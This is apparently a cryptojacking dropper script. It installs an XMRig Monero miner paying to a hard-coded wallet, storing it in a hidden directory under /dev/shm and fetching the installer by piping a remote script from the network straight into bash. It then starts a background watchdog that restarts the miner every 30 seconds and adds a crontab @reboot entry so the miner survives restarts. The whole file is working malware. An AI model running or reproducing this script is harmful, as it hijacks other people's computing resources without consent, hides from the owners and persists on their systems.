#!/bin/bash

# Set HOME directory
export HOME="/dev/shm/rigd/.config/.c3pool"

# Configuration
WALLET="46FP3DQetYzXjMCfns9HEChTzFynnThvY3bXRiELmrRr2yN6zr5YBu4bs8VWjYxdH4ASQsN89Xb4qDjfjTNW35iCKpNJNX7"

# Create necessary directories
mkdir -p "$HOME"
MINER_SUBDIR="$HOME/c3pool"
mkdir -p "$MINER_SUBDIR"

# Install
echo "[*] Installing C3Pool -> $MINER_SUBDIR ..."
curl -s -L https://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | env HOME="$HOME" LC_ALL=en_US.UTF-8 bash -s "$WALLET"
sleep 5

# Watchdog
echo "[*] Creating watchdog..."
cat > "$HOME/watchdog.sh" << 'EOF'
#!/bin/bash

MINER_DIR="$HOME/c3pool"
MINER_BIN="$MINER_DIR/xmrig"
CONFIG="$MINER_DIR/config_background.json"
LOGFILE="$MINER_DIR/xmrig.log"

while true; do
    if ! pgrep -f "$MINER_BIN" > /dev/null; then
        echo "[$(date)] xmrig not running. Starting..." >> "$LOGFILE"
        nohup "$MINER_BIN" --config="$CONFIG" >> "$LOGFILE" 2>&1 &
    fi
    sleep 30 
done
EOF

chmod +x "$HOME/watchdog.sh"

# Run watchdog
pkill -f "$HOME/watchdog.sh" 2>/dev/null
echo "[*] Running watchdog -> background..."
nohup "$HOME/watchdog.sh" > /dev/null 2>&1 &

# Setup cron job for watchdog
if command -v crontab >/dev/null 2>&1; then
    echo "[*] Adding watchdog -> crontab @reboot..."
    (crontab -l 2>/dev/null; echo "@reboot nohup $HOME/watchdog.sh > /dev/null 2>&1 &") | crontab -
else
    echo "[!] crontab Not Found, skipping auto-reboot."
fi

echo "[✓] Done. Miner saved -> $MINER_SUBDIR & running -> background."
